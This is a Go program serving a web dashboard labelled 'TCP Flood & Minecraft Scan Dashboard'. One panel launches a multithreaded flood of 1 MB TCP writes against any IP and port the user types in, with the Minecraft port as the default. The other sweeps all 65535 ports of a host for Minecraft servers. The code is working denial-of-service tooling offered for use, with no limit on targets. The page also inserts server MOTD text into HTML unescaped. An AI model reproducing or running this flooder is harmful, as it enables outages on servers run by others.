package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var totalPackets uint64

type cpuTimes struct {
	idle  uint64
	total uint64
}

func readCPU() (cpuTimes, error) {
	f, err := os.Open("/proc/stat")
	if err != nil {
		return cpuTimes{}, err
	}
	defer f.Close()

	var cpu string
	var user, nice, system, idle, iowait, irq, softirq, steal uint64
	_, err = fmt.Fscanf(f, "%s %d %d %d %d %d %d %d %d", &cpu, &user, &nice, &system, &idle, &iowait, &irq, &softirq, &steal)
	if err != nil {
		return cpuTimes{}, err
	}
	total := user + nice + system + idle + iowait + irq + softirq + steal
	return cpuTimes{idle: idle, total: total}, nil
}

func calcCPU(prev, curr cpuTimes) float64 {
	idleDiff := float64(curr.idle - prev.idle)
	totalDiff := float64(curr.total - prev.total)
	if totalDiff <= 0 {
		return 0
	}
	return (1.0 - idleDiff/totalDiff) * 100
}

func getSystemRAMUsageMB() uint64 {
	f, err := os.Open("/proc/meminfo")
	if err != nil {
		var m runtime.MemStats
		runtime.ReadMemStats(&m)
		return m.Alloc / 1024 / 1024
	}
	defer f.Close()

	var memTotal, memAvailable uint64
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, "MemTotal:") {
			fmt.Sscanf(line, "MemTotal: %d kB", &memTotal)
		} else if strings.HasPrefix(line, "MemAvailable:") {
			fmt.Sscanf(line, "MemAvailable: %d kB", &memAvailable)
		}
		if memTotal > 0 && memAvailable > 0 {
			break
		}
	}

	if memTotal == 0 {
		var m runtime.MemStats
		runtime.ReadMemStats(&m)
		return m.Alloc / 1024 / 1024
	}

	usedKB := memTotal - memAvailable
	return usedKB / 1024
}

func measureTCPPing(serverIP string, serverPort int, timeout time.Duration) int64 {
	if serverIP == "" || serverPort <= 0 {
		return -1
	}
	addr := fmt.Sprintf("%s:%d", serverIP, serverPort)
	start := time.Now()
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return -1
	}
	conn.Close()
	return time.Since(start).Milliseconds()
}

type Stats struct {
	Elapsed          float64 `json:"elapsed"`
	CPU              float64 `json:"cpu"`
	RAMMB            uint64  `json:"ramMB"`
	TotalPackets     uint64  `json:"totalPackets"`
	PacketsPerSecond float64 `json:"packetsPerSecond"`
	Ping             string  `json:"ping"`
	Status           string  `json:"status"`
}

type ScanProgress struct {
	Host    string            `json:"host"`
	Scanned uint64            `json:"scanned"`
	Total   int               `json:"total"`
	Found   []MinecraftServer `json:"found"`
}

type RunContext struct {
	stop chan struct{}
	once sync.Once
}

type AppState struct {
	mu        sync.Mutex
	running   bool
	mode      string
	startTime time.Time
	stats     Stats
	scan      ScanProgress
	ctx       *RunContext
	lastError string
}

func (a *AppState) startRun(mode string) bool {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.running {
		return false
	}
	a.running = true
	a.mode = mode
	a.lastError = ""
	a.startTime = time.Now()
	a.ctx = &RunContext{stop: make(chan struct{})}
	atomic.StoreUint64(&totalPackets, 0)
	a.stats = Stats{Status: "Running"}
	return true
}

func (a *AppState) stopRun(status string) {
	a.mu.Lock()
	ctx := a.ctx
	if ctx != nil {
		ctx.once.Do(func() { close(ctx.stop) })
	}
	a.stats.Status = status
	a.mu.Unlock()
}

func (a *AppState) finishRun(status string) {
	a.mu.Lock()
	a.running = false
	a.stats.Status = status
	a.ctx = nil
	a.mu.Unlock()
}

func (a *AppState) updateStats(update Stats) {
	a.mu.Lock()
	if !a.running {
		a.mu.Unlock()
		return
	}
	a.stats = update
	a.mu.Unlock()
}

func (a *AppState) updateScan(found []MinecraftServer, scanned uint64, total int, host string) {
	a.mu.Lock()
	a.scan.Found = append([]MinecraftServer(nil), found...)
	a.scan.Scanned = scanned
	a.scan.Total = total
	a.scan.Host = host
	a.mu.Unlock()
}

func (a *AppState) statusResponse() map[string]any {
	a.mu.Lock()
	defer a.mu.Unlock()
	return map[string]any{
		"running": a.running,
		"mode":    a.mode,
		"stats":   a.stats,
		"scan":    a.scan,
		"error":   a.lastError,
	}
}

func startMonitorWeb(app *AppState, ctx *RunContext, startTime time.Time, serverIP string, serverPort int, enablePing bool) {
	prevCPU, err := readCPU()
	if err != nil {
		prevCPU = cpuTimes{}
	}

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	lastPackets := atomic.LoadUint64(&totalPackets)
	lastTime := time.Now()

	for {
		select {
		case <-ctx.stop:
			return
		case <-ticker.C:
			currCPU, err := readCPU()
			cpuUsage := 0.0
			if err == nil && prevCPU.total != 0 {
				cpuUsage = calcCPU(prevCPU, currCPU)
				prevCPU = currCPU
			}

			ramMB := getSystemRAMUsageMB()
			now := time.Now()
			total := atomic.LoadUint64(&totalPackets)
			dt := now.Sub(lastTime).Seconds()
			pps := 0.0
			if dt > 0 {
				pps = float64(total-lastPackets) / dt
			}
			lastPackets = total
			lastTime = now

			elapsed := now.Sub(startTime).Seconds()
			pingStr := "--"
			if enablePing {
				ping := measureTCPPing(serverIP, serverPort, time.Second)
				if ping >= 0 {
					pingStr = fmt.Sprintf("%dms", ping)
				}
			}

			app.updateStats(Stats{
				Elapsed:          elapsed,
				CPU:              cpuUsage,
				RAMMB:            ramMB,
				TotalPackets:     total,
				PacketsPerSecond: pps,
				Ping:             pingStr,
				Status:           "Running",
			})
		}
	}
}

func sendPacket(serverIP string, serverPort int, packet []byte, packetCount int, packetTimeout time.Duration, useDeadline bool, deadline time.Time, stop <-chan struct{}) {
	addr := fmt.Sprintf("%s:%d", serverIP, serverPort)
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	for i := 0; i < packetCount; i++ {
		select {
		case <-stop:
			return
		default:
		}

		if useDeadline && time.Now().After(deadline) {
			return
		}

		if _, err := conn.Write(packet); err != nil {
			return
		}

		atomic.AddUint64(&totalPackets, 1)

		if packetTimeout > 0 {
			select {
			case <-stop:
				return
			case <-time.After(packetTimeout):
			}
		}
	}
}

type PlayersInfo struct {
	Max    int `json:"max"`
	Online int `json:"online"`
}

type StatusResponse struct {
	Version struct {
		Name     string `json:"name"`
		Protocol int    `json:"protocol"`
	} `json:"version"`
	Players     PlayersInfo `json:"players"`
	Description any         `json:"description"`
}

type MinecraftServer struct {
	Host     string `json:"host"`
	Port     int    `json:"port"`
	Online   int    `json:"online"`
	Max      int    `json:"max"`
	Version  string `json:"version"`
	Protocol int    `json:"protocol"`
	MOTD     string `json:"motd"`
	PingMS   int64  `json:"pingMS"`
}

func writeVarInt(w io.Writer, v int) {
	for {
		b := byte(v & 0x7F)
		v >>= 7
		if v != 0 {
			b |= 0x80
		}
		w.Write([]byte{b})
		if v == 0 {
			break
		}
	}
}

func readVarInt(r io.Reader) (int, error) {
	var v, shift int
	for i := 0; i < 5; i++ {
		b := make([]byte, 1)
		if _, err := r.Read(b); err != nil {
			return 0, err
		}
		val := int(b[0] & 0x7F)
		v |= val << shift
		shift += 7
		if b[0]&0x80 == 0 {
			return v, nil
		}
	}
	return 0, fmt.Errorf("VarInt too big")
}

func writeMCString(w io.Writer, s string) {
	writeVarInt(w, len(s))
	w.Write([]byte(s))
}

type bytesBuffer struct{ buf []byte }

func (b *bytesBuffer) Write(p []byte) (int, error) {
	b.buf = append(b.buf, p...)
	return len(p), nil
}

func queryServer(host string, port int) (*MinecraftServer, error) {
	start := time.Now()
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := net.DialTimeout("tcp", addr, 4*time.Second)
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	hs := make([]byte, 0, 100)
	buf := &bytesBuffer{buf: hs}
	writeVarInt(buf, 0)
	writeVarInt(buf, 758)
	writeMCString(buf, host)
	buf.Write([]byte{byte(port >> 8), byte(port & 0xFF)})
	writeVarInt(buf, 1)

	writeVarInt(conn, len(buf.buf))
	conn.Write(buf.buf)

	writeVarInt(conn, 1)
	writeVarInt(conn, 0)

	conn.SetReadDeadline(time.Now().Add(4 * time.Second))
	_, _ = readVarInt(conn)
	if pktID, _ := readVarInt(conn); pktID != 0 {
		return nil, fmt.Errorf("not status packet")
	}

	jsonLen, _ := readVarInt(conn)
	jsonData := make([]byte, jsonLen)
	if _, err := io.ReadFull(conn, jsonData); err != nil {
		return nil, err
	}

	var status StatusResponse
	if err := json.Unmarshal(jsonData, &status); err != nil {
		return nil, err
	}

	ping := time.Since(start).Milliseconds()
	motd := fmt.Sprintf("%v", status.Description)
	if s, ok := status.Description.(string); ok {
		motd = s
	}
	motd = strings.ReplaceAll(strings.ReplaceAll(motd, "\n", " | "), "§", "&")

	return &MinecraftServer{
		Host:     host,
		Port:     port,
		Online:   status.Players.Online,
		Max:      status.Players.Max,
		Version:  status.Version.Name,
		Protocol: status.Version.Protocol,
		MOTD:     motd,
		PingMS:   ping,
	}, nil
}

func scanPort(host string, port int, scanned *uint64, found *[]MinecraftServer, mu *sync.Mutex, stop <-chan struct{}) {
	select {
	case <-stop:
		return
	default:
	}

	atomic.AddUint64(scanned, 1)
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 3*time.Second)
	if err != nil {
		return
	}
	conn.Close()

	if server, err := queryServer(host, port); err == nil {
		mu.Lock()
		*found = append(*found, *server)
		mu.Unlock()
	}
}

func runTCPFlood(app *AppState, req floodRequest) {
	if !app.startRun("tcp-flood") {
		app.mu.Lock()
		app.lastError = "Another job is already running"
		app.mu.Unlock()
		return
	}

	ctx := app.ctx
	start := time.Now()
	packet := make([]byte, 1024*1024)
	useDeadline := req.DurationSeconds > 0
	deadline := start.Add(time.Duration(req.DurationSeconds) * time.Second)
	packetTimeout := time.Duration(req.PacketTimeoutMs) * time.Millisecond

	go startMonitorWeb(app, ctx, start, req.IP, req.Port, true)

	var wg sync.WaitGroup
	for i := 0; i < req.ThreadCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sendPacket(req.IP, req.Port, packet, req.PacketCountPerThread, packetTimeout, useDeadline, deadline, ctx.stop)
		}()
	}

	wg.Wait()
	ctx.once.Do(func() { close(ctx.stop) })

	elapsed := time.Since(start).Seconds()
	total := atomic.LoadUint64(&totalPackets)
	finalStats := Stats{
		Elapsed:          elapsed,
		TotalPackets:     total,
		PacketsPerSecond: 0,
		Status:           "Completed",
	}
	if elapsed > 0 {
		finalStats.PacketsPerSecond = float64(total) / elapsed
	}
	finalStats.RAMMB = getSystemRAMUsageMB()
	finalStats.Ping = "--"
	finalStats.CPU = app.stats.CPU
	app.updateStats(finalStats)

	app.finishRun("Completed")
}

func runScan(app *AppState, host string) {
	if !app.startRun("scan") {
		app.mu.Lock()
		app.lastError = "Another job is already running"
		app.mu.Unlock()
		return
	}
	ctx := app.ctx
	const totalPorts = 65535
	var scanned uint64
	found := make([]MinecraftServer, 0)
	var mu sync.Mutex

	start := time.Now()
	go startMonitorWeb(app, ctx, start, host, 25565, false)

	workerLimit := 512
	sem := make(chan struct{}, workerLimit)
	var wg sync.WaitGroup
	for port := 1; port <= totalPorts; port++ {
		select {
		case <-ctx.stop:
			break
		default:
		}

		sem <- struct{}{}
		wg.Add(1)
		go func(p int) {
			defer wg.Done()
			scanPort(host, p, &scanned, &found, &mu, ctx.stop)
			<-sem
			app.updateScan(found, scanned, totalPorts, host)
		}(port)
	}

	wg.Wait()
	ctx.once.Do(func() { close(ctx.stop) })

	sort.Slice(found, func(i, j int) bool { return found[i].Online > found[j].Online })
	app.updateScan(found, scanned, totalPorts, host)
	app.finishRun("Completed")
}

type floodRequest struct {
	IP                   string `json:"ip"`
	Port                 int    `json:"port"`
	PacketCountPerThread int    `json:"packetCountPerThread"`
	ThreadCount          int    `json:"threadCount"`
	PacketTimeoutMs      int    `json:"packetTimeoutMs"`
	DurationSeconds      int    `json:"durationSeconds"`
}

func handleStartFlood(app *AppState) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		var req floodRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "invalid request", http.StatusBadRequest)
			return
		}

		if req.IP == "" || req.Port <= 0 || req.Port > 65535 || req.PacketCountPerThread <= 0 || req.ThreadCount <= 0 {
			http.Error(w, "missing or invalid fields", http.StatusBadRequest)
			return
		}

		go runTCPFlood(app, req)
		w.WriteHeader(http.StatusAccepted)
	}
}

func handleStartScan(app *AppState) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		var body struct {
			Host string `json:"host"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			http.Error(w, "invalid request", http.StatusBadRequest)
			return
		}
		if strings.TrimSpace(body.Host) == "" {
			http.Error(w, "host is required", http.StatusBadRequest)
			return
		}

		go runScan(app, strings.TrimSpace(body.Host))
		w.WriteHeader(http.StatusAccepted)
	}
}

func handleStop(app *AppState) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		app.stopRun("Stopped")
		w.WriteHeader(http.StatusOK)
	}
}

func handleStatus(app *AppState) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		resp := app.statusResponse()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
	}
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	io.WriteString(w, indexHTML)
}

func main() {
	app := &AppState{}

	http.HandleFunc("/", handleIndex)
	http.Handle("/api/start-flood", handleStartFlood(app))
	http.Handle("/api/start-scan", handleStartScan(app))
	http.Handle("/api/stop", handleStop(app))
	http.Handle("/api/status", handleStatus(app))

	log.Println("Web server running on http://localhost:8080")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		log.Fatalf("server error: %v", err)
	}
}

const indexHTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>TCP Flood + Minecraft Scanner</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js"></script>
    <style>
        body { background: #0b1220; color: #e6e9ef; }
        .card { background: #101827; border: 1px solid #1f2937; }
        .badge-pill { border-radius: 50px; }
        pre { color: #a8b3cf; }
    </style>
</head>
<body class="py-4">
    <div class="container">
        <div class="text-center mb-4">
            <h1 id="title" class="fw-bold">TCP Flood & Minecraft Scan Dashboard</h1>
            <p class="text-secondary">AJAX-powered control panel with Bootstrap + anime.js</p>
        </div>
        <div class="row g-4">
            <div class="col-lg-6">
                <div class="card shadow-sm h-100">
                    <div class="card-body">
                        <div class="d-flex align-items-center justify-content-between mb-3">
                            <h5 class="card-title mb-0">TCP Flood</h5>
                            <span class="badge bg-primary text-uppercase">Live</span>
                        </div>
                        <form id="flood-form" class="row g-3">
                            <div class="col-md-8">
                                <label class="form-label">Target IP</label>
                                <input type="text" class="form-control" name="ip" placeholder="1.2.3.4" required />
                            </div>
                            <div class="col-md-4">
                                <label class="form-label">Port</label>
                                <input type="number" class="form-control" name="port" min="1" max="65535" value="25565" />
                            </div>
                            <div class="col-md-6">
                                <label class="form-label">Packets / Thread</label>
                                <input type="number" class="form-control" name="packetCountPerThread" value="50" min="1" />
                            </div>
                            <div class="col-md-6">
                                <label class="form-label">Threads</label>
                                <input type="number" class="form-control" name="threadCount" value="4" min="1" />
                            </div>
                            <div class="col-md-6">
                                <label class="form-label">Packet Timeout (ms)</label>
                                <input type="number" class="form-control" name="packetTimeoutMs" value="0" min="0" />
                            </div>
                            <div class="col-md-6">
                                <label class="form-label">Duration (s, 0 = until count)</label>
                                <input type="number" class="form-control" name="durationSeconds" value="0" min="0" />
                            </div>
                            <div class="col-12 d-flex gap-2">
                                <button type="submit" class="btn btn-success flex-fill">Start Flood</button>
                                <button id="stop-btn" type="button" class="btn btn-outline-danger flex-fill">Stop</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <div class="col-lg-6">
                <div class="card shadow-sm h-100">
                    <div class="card-body">
                        <div class="d-flex align-items-center justify-content-between mb-3">
                            <h5 class="card-title mb-0">Minecraft Scan</h5>
                            <span class="badge bg-warning text-dark text-uppercase">Async</span>
                        </div>
                        <form id="scan-form" class="row g-3">
                            <div class="col-12">
                                <label class="form-label">Hostname / IP</label>
                                <input type="text" class="form-control" name="host" placeholder="example.com" required />
                            </div>
                            <div class="col-12 d-flex gap-2">
                                <button type="submit" class="btn btn-info flex-fill">Start Scan</button>
                                <button id="stop-btn-2" type="button" class="btn btn-outline-danger flex-fill">Stop</button>
                            </div>
                            <div class="col-12">
                                <small class="text-secondary">Full 1-65535 TCP sweep with live status. Stop anytime.</small>
                            </div>
                            <div class="col-12">
                                <div class="progress" style="height: 10px;">
                                    <div id="scan-progress-bar" class="progress-bar bg-info" role="progressbar" style="width: 0%"></div>
                                </div>
                                <small class="text-secondary" id="scan-progress-text">Idle</small>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

        </div>

        <div class="card shadow-sm mt-4">
            <div class="card-body">
                <div class="d-flex align-items-center justify-content-between mb-2">
                    <h5 class="card-title mb-0">Live Status</h5>
                    <span id="mode-label" class="badge bg-secondary">Idle</span>
                </div>
                <div class="row text-center g-3" id="stats-row">
                    <div class="col-sm-6 col-lg-3">
                        <div class="p-3 border rounded-3">
                            <div class="text-secondary">Elapsed</div>
                            <div class="fs-4" id="elapsed">0s</div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-3">
                        <div class="p-3 border rounded-3">
                            <div class="text-secondary">Packets</div>
                            <div class="fs-4" id="packets">0</div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-3">
                        <div class="p-3 border rounded-3">
                            <div class="text-secondary">Rate</div>
                            <div class="fs-4" id="rate">0 pkt/s</div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-lg-3">
                        <div class="p-3 border rounded-3">
                            <div class="text-secondary">System</div>
                            <div class="fs-4" id="system">CPU 0% / RAM 0 MB</div>
                        </div>
                    </div>
                </div>
                <pre class="mt-3" id="log" style="min-height: 120px;">Waiting for job...</pre>
            </div>
        </div>

        <div class="card shadow-sm mt-4">
            <div class="card-body">
                <div class="d-flex align-items-center justify-content-between mb-3">
                    <h5 class="card-title mb-0">Minecraft Servers Found</h5>
                    <span class="badge bg-info text-dark" id="scan-progress">0 / 0</span>
                </div>
                <div class="table-responsive">
                    <table class="table table-dark table-striped align-middle">
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>IP:Port</th>
                                <th>Players</th>
                                <th>Ping</th>
                                <th>Version</th>
                                <th>MOTD</th>
                            </tr>
                        </thead>
                        <tbody id="servers-body">
                            <tr>
                                <td colspan="6" class="text-center text-secondary">No data yet</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <script>
        anime({ targets: '#title', translateY: [-10, 0], opacity: [0, 1], duration: 800, easing: 'easeOutQuad' });

        function toNumber(value, fallback = 0) {
            const n = Number(value);
            return Number.isFinite(n) ? n : fallback;
        }

        function renderServers(found) {
            const body = $('#servers-body');
            body.empty();
            if (!found || found.length === 0) {
                body.append('<tr><td colspan="6" class="text-center text-secondary">No data yet</td></tr>');
                return;
            }
            found.forEach((s, idx) => {
                body.append(
                    '<tr>' +
                        '<td>' + (idx + 1) + '</td>' +
                        '<td>' + s.host + ':' + s.port + '</td>' +
                        '<td>' + s.online + '/' + s.max + '</td>' +
                        '<td>' + s.pingMS + ' ms</td>' +
                        '<td>' + s.version + '</td>' +
                        '<td>' + s.motd + '</td>' +
                    '</tr>'
                );
            });
        }

        function updateStatus() {
            $.getJSON('/api/status', (data) => {
                const stats = data.stats || {};
                const scan = data.scan || {};
                $('#mode-label').text(data.running ? (data.mode || 'Running') : 'Idle');
                $('#elapsed').text((stats.elapsed?.toFixed?.(1) || 0) + 's');
                $('#packets').text(stats.totalPackets || 0);
                $('#rate').text((stats.packetsPerSecond || 0).toFixed(1) + ' pkt/s');
                $('#system').text('CPU ' + toNumber(stats.cpu).toFixed(1) + '% / RAM ' + (stats.ramMB || 0) + ' MB / Ping ' + (stats.ping || '--'));

                if (data.error) {
                    $('#log').text('Error: ' + data.error);
                } else {
                    const lines = [
                        'Status: ' + (stats.status || 'Idle'),
                        'Running: ' + data.running,
                        'Mode: ' + (data.mode || 'n/a'),
                        'Total Packets: ' + (stats.totalPackets || 0),
                    ];

                    if (data.mode === 'scan') {
                        const percent = scan.total ? ((scan.scanned || 0) / scan.total * 100).toFixed(2) : '0.00';
                        lines.push('Scan host: ' + (scan.host || '-'));
                        lines.push('Scan progress: ' + (scan.scanned || 0) + ' / ' + (scan.total || 0) + ' (' + percent + '%)');
                        lines.push('Servers found: ' + (scan.found || []).length);
                    }

                    $('#log').text(lines.join('\n'));
                }

                const progress = (scan.scanned || 0) + ' / ' + (scan.total || 0);
                $('#scan-progress').text(progress);
                const percent = scan.total ? Math.min(100, ((scan.scanned || 0) / scan.total) * 100) : 0;
                $('#scan-progress-bar').css('width', percent + '%');
                $('#scan-progress-text').text(scan.total ? (scan.host || '-') + ' • ' + progress + ' (' + percent.toFixed(2) + '%)' : 'Idle');
                renderServers(scan.found);
            });
        }

        $('#flood-form').on('submit', function (e) {
            e.preventDefault();
            const payload = {
                ip: this.ip.value.trim(),
                port: Number(this.port.value),
                packetCountPerThread: Number(this.packetCountPerThread.value),
                threadCount: Number(this.threadCount.value),
                packetTimeoutMs: Number(this.packetTimeoutMs.value),
                durationSeconds: Number(this.durationSeconds.value),
            };
            $.ajax({
                url: '/api/start-flood',
                method: 'POST',
                data: JSON.stringify(payload),
                contentType: 'application/json',
            }).then(() => {
                $('#log').text('Flood started...');
            }).catch(() => {
                $('#log').text('Failed to start flood.');
            });
        });

        $('#scan-form').on('submit', function (e) {
            e.preventDefault();
            const payload = { host: this.host.value.trim() };
            $.ajax({
                url: '/api/start-scan',
                method: 'POST',
                data: JSON.stringify(payload),
                contentType: 'application/json',
            }).then(() => {
                $('#log').text('Scanning ports...');
            }).catch(() => {
                $('#log').text('Failed to start scan.');
            });
        });

        $('#stop-btn, #stop-btn-2').on('click', () => {
            $.post('/api/stop').then(() => {
                $('#log').text('Stop requested.');
            });
        });

        setInterval(updateStatus, 1000);
        updateStatus();
    </script>
</body>
</html>
`
